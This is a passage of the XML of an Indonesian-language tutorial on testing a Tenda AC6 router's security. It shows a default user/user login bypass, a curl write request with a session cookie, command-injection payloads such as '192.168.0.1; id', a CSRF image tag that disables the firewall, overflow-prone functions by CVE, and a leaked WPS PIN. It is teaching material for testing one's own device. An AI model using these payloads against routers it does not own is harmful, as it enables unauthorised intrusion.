          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># login.html mengirim: username=admin &amp; password=hex_md5(password)</w:t>
        <w:br/>
        <w:t># JS login.js:</w:t>
        <w:br/>
        <w:t>#   ret = { username: ..., password: hex_md5(this.getPassword()) }</w:t>
        <w:br/>
        <w:t># POST ke /login/Auth</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Pelajaran:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> password di-hash MD5 di sisi klien. Artinya hash itulah yang jadi 'kunci' di jaringan. MD5 tidak layak untuk password (cepat, tanpa salt, pernah dibobol). Selain itu, semua lewat HTTP → siapa pun di LAN bisa menyadap.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>7.2 Cookie sesi</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Set-Cookie: password=435ad074e1ae113f062860bf3b1627bd...; path=/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banyak router memakai cookie bernama `password` (atau `sysauth`, `session`, `Authorization`). Nilai cookie ini yang dikirim di setiap request untuk membuktikan sesi. Nanti kita lihat betapa lemahnya model ini.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>KELAS KERENTANAN &amp; POLA</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Bagian ini adalah 'kamus pola'. Untuk setiap kelas celah: apa itu, mengapa terjadi, bagaimana menemukannya, dan contoh nyata di perangkat Anda.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>8. Auth Bypass &amp; Backdoor Account</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>8.1 Apa &amp; mengapa terjadi</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Auth bypass = melewati login. Penyebab umum: (a) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>akun tersembunyi/default</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> yang tidak didokumentasikan, (b) endpoint yang lupa diberi pengecekan auth, (c) logika auth yang cacat.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09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23_auth_bypas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5. Alur auth bypass pada perangkat ini.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>8.2 Menemukannya (langkah)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Temukan endpoint login (di sini `/login/Auth` dari `login.js`).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Uji kredensial default &amp; tak terduga: admin/admin, admin/1234, user/user, support/1234, root/root.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Perhatikan **perbedaan respons** — ini kuncinya.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># semua ini GAGAL (balas "1"):</w:t>
        <w:br/>
        <w:t>admin/admin -&gt; 1     admin/1234 -&gt; 1     admin/&lt;blank&gt; -&gt; 1</w:t>
        <w:br/>
        <w:br/>
        <w:t># ini BERHASIL (302 + Set-Cookie):</w:t>
        <w:br/>
        <w:t>POST /login/Auth  username=user&amp;password=user</w:t>
        <w:br/>
        <w:t>HTTP/1.0 302 Redirect</w:t>
        <w:br/>
        <w:t>Set-Cookie: password=...; path=/</w:t>
        <w:br/>
        <w:t>Location: http://192.168.0.1/main.html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18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11_authby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6. Bukti live login bypass user:user.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>8.3 Pelajaran pola</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Jangan hanya coba admin/admin. Coba banyak username: user, support, guest, root, nobody.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Bandingkan respons: yang gagal balas '1', yang sukses balas 302 + Set-Cookie.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Cek CVE sejenis: CVE-2024-46450 tepat mendeskripsikan 'ubah kredensial jadi user/user'.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Pola besar:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> akun 'service' (user/support/guest) sering dibuat untuk maintenance/vendor dan lupa dihapus/default. Selalu cari 'akun kedua'.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>8.4 Dampak &amp; tingkat</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Bypass seperti ini = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CRITICAL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, karena memberi </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>C:H / I:H</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (baca + ubah semua). Bukti akses tulis (idempoten, tidak mengubah apa pun):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -H "Cookie: $CK" -X POST http://192.168.0.1/goform/SetSysTimeCfg \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     --data 'timePeriod=86400&amp;ntpServer=time.windows.com&amp;timeZone=19:00'</w:t>
        <w:br/>
        <w:t># -&gt; {"errCode":0}   (server menerima perintah tulis)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>9. Information Disclosure</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Kebocoran informasi = memberi penyerang 'amunisi'. Sering dianggap sepele, padahal menjadi pintu masuk serangan lain.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>9.1 Bentuk-bentuk</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Source code / config bocor tanpa auth (js/*.js).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Password tersimpan &amp; ditampilkan cleartext (wifi password).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Daftar klien/DHCP, hostname, MAC bocor.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Versi firmware bocor → mempermudah pencarian CVE.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33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12_wifi_le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3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7. /goform/WifiBasicGet membocorkan password WiFi (cleartext).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829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15_cl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8. /goform/GetIpMacBind — daftar perangkat di jaringan.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>9.2 Mengapa berbahaya</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Password WiFi cleartext = penyerang langsung bisa join jaringan. Daftar klien = untuk targeting. Versi firmware = untuk memilih exploit yang tepat.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>9.3 Pelajaran</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Cek endpoint 'Get*' — sering mengembalikan lebih banyak dari yang ditampilkan UI.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Perhatikan field seperti `wrlPwd`, `adslPwd`, `pppPwd`, `password`, `pinCode`.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>UI menyembunyikan password dengan bintang, tetapi API-nya mengirim teks asli.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>10. Command Injection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>10.1 Konsep</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Terjadi saat input pengguna dimasukkan ke </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>shell command</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> tanpa sanitasi, misal di kode: `system("ping ")`, `sprintf(cmd, "...%s", input)`, lalu `popen(cmd)`. Karakter seperti `;` `|` `&amp;&amp;` ``` ` ``` `$( )` bisa menyisipkan perintah tambahan.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Input normal : 192.168.0.1</w:t>
        <w:br/>
        <w:t>Payload uji  : 192.168.0.1; id</w:t>
        <w:br/>
        <w:t>Efek         : di-shell menjadi -&gt;  ping -c1 192.168.0.1; id</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>10.2 Di mana mencarinya di router</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Fitur diagnostik: ping, traceroute, nslookup (paling sering!).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Fitur DDNS/cloud: hostname yang dikirim ke skrip.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Fitur QoS/static route/mac filter: nilai yang dikemas jadi perintah.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Parameter yang tampak seperti nama file/interface.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>10.3 Cara menguji dengan aman</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Uji dulu dengan payload </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>tidak berbahaya</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> dan bedakan output/nama file:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># payload jinak (jangan langsung ';reboot'):</w:t>
        <w:br/>
        <w:t>192.168.0.1; echo pwntest</w:t>
        <w:br/>
        <w:t>192.168.0.1 | id</w:t>
        <w:br/>
        <w:t>192.168.0.1 &amp;&amp; whoami</w:t>
        <w:br/>
        <w:t># atau blind: 192.168.0.1; sleep 5   (ukur waktu respons)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Jika butuh auth, gabungkan dengan bypass di Bab 8 (endpoint Set* sudah bisa diakses).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Selalu uji di perangkat sendiri; jangan pakai payload destruktif.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CVE lini AC6 banyak berupa injeksi di fungsi `formSet*`/`set*` (mis. `setWizard`, `SetSpeedWan`). Pola nama fungsi `formSetXxx` adalah petunjuk kuat.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>11. Buffer Overflow (Stack)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>11.1 Konsep</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Jika program menyalin input ke buffer berukuran tetap tanpa memeriksa panjang (`strcpy`, `sprintf`, `sscanf("%s")`, `gets`), input panjang bisa menimpa memori sekitarnya — termasuk </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>return address</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">. Efek: crash (DoS) atau, bila dirancang, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>eksekusi kode (RCE)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>char buf[64];</w:t>
        <w:br/>
        <w:t>strcpy(buf, user_input);  // input &gt; 64 byte -&gt; menimpa stack!</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>11.2 Pola di Tenda (dari CVE publik, lini AC6 v2.0 / 15.03.06.x)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CVE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Fungsi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CVE-2024-51116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formSetPPTPServer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CVE-2024-52714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fromSetSysTime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SetSpeedWan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speed_dir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fast_setting_wifi_set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addressNat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CVE-2023-38931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setaccount (/cloudv2)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CVE-2022-25458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cmdinput</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Pola umum:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> parameter seperti `list`, `page`, `ssid`, `time`, `name`, `ip` yang panjangnya tak dibatasi. Nama fungsi 'exeCommand'/'setaccount' = kandidat injeksi/overflow.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>11.3 Cara menemukan &amp; menguji (aman)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Kirim string panjang bertahap (mis. 200, 500, 1000, 5000 byte) ke parameter kandidat.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Amati: respons error, koneksi putus, atau router reboot = indikasi overflow (DoS).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Untuk analisis mendalam: ekstrak httpd, buka di Ghidra, cari fungsi dari daftar CVE.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Peringatan:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> uji overflow bisa </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>membuat web server crash/reboot</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>. Lakukan saat Anda siap. Di buku ini kita tidak menembakkan payload perusak ke perangkat Anda.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>12. CSRF &amp; XSS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>12.1 CSRF (Cross-Site Request Forgery)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Karena admin memakai cookie otomatis, situs jahat bisa membuat browser admin mengirim perintah ke router (mis. ganti DNS). Bentuk paling ganas: halaman web biasa menyisipkan `&lt;img src='http://192.168.0.1/goform/SetXxx?...'&gt;`.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;!-- halaman jahat yang dikunjungi admin --&gt;</w:t>
        <w:br/>
        <w:t>&lt;img src="http://192.168.0.1/goform/SetFirewallCfg?firewallEn=0"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CVE terkait</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> pada AC6: CVE-2022-45673 (CSRF `fromSysToolRestoreSet`), CVE-2022-45674 (CSRF `fromSysToolReboot`).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Pola: endpoint 'Set' yang **tidak memeriksa CSRF token** dan menerima GET/POST sederhana.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>12.2 XSS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Jika input ditampilkan tanpa escape (mis. nama perangkat), skrip bisa jalan di browser admin. Cari field yang outputnya muncul kembali di halaman status/nama device.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>12.3 Pelajaran</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Cookie tanpa atribut SameSite + tidak ada token = rawan CSRF.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>UI menyembunyikan password, tapi API teks polos (lihat Bab 9).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>13. UPnP &amp; WPS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>13.1 UPnP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">UPnP memungkinkan aplikasi di LAN membuka </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>port forward</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> ke WAN tanpa login. Jika disalahgunakan, penyerang memaparkan service internal ke internet. Di perangkat Anda UPnP </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>aktif</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (`upnp:1`).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># cek status (via sesi):</w:t>
        <w:br/>
        <w:t>GET /goform/GetAdvanceStatus -&gt; {"upnp":"1", "cloud":"1", ...}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>13.2 WPS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">WPS memudahkan koneksi WiFi tanpa password. Masalahnya: PIN 8 digit bisa di-brute force (pixie-dust), dan bila bocor, penyerang join WiFi tanpa WPA2. Di perangkat Anda WPS </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>aktif</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> dan PIN-nya </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>terbaca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829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13_wps_lea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9. WPS aktif dan PIN bocor (69043949).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Pelajaran:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> fitur kenyamanan (WPS, UPnP, cloud) sering menjadi celah. Selalu cek statusnya dan matikan bila tidak perlu.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31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4_sysinf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3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10. Status fitur: UPnP &amp; cloud aktif, remote web mati.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>ANALISIS FIRMWARE</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Sampai sini kita menyerang 'dari luar'. Sekarang kita masuk ke 'dalam' — mengambil dan membedah firmware. Inilah inti yang Anda tunggu.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152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22_firmware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1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11. Alur analisis firmware.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>14. Akuisisi Firmware</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Ada dua jalur: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>lunak</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (tanpa alat) dan </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>keras</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (butuh alat yang sedang dikirim).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>14.1 Jalur lunak</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Unduh dari situs vendor (cari 'Tenda AC6 firmware download').</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ambil dari update OTA: intersepsi/lookup URL update.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Config/backup dari UI admin (kadang berisi informasi berguna).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>GET /goform/GetSysAutoRebbotCfg    # info update</w:t>
        <w:br/>
        <w:t># atau telebak URL upgrade dari UI System -&gt; Upgrade</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>14.2 Jalur keras (saat alat tiba)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>UART: baca bootlog, mungkin masuk shell (Bab 19).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>SPI flash: dump chip dengan CH341A + clip SOIC-8 (Bab 20) → dapat firmware 'mentah' 100%.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>JTAG: akses tingkat rendah (boundary scan, debug).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Mengapa dump fisik penting:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> firmware dari vendor bisa berbeda dari yang benar-benar ada di perangkat. Dump fisik = kebenaran.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>15. Ekstraksi Firmware</w:t>
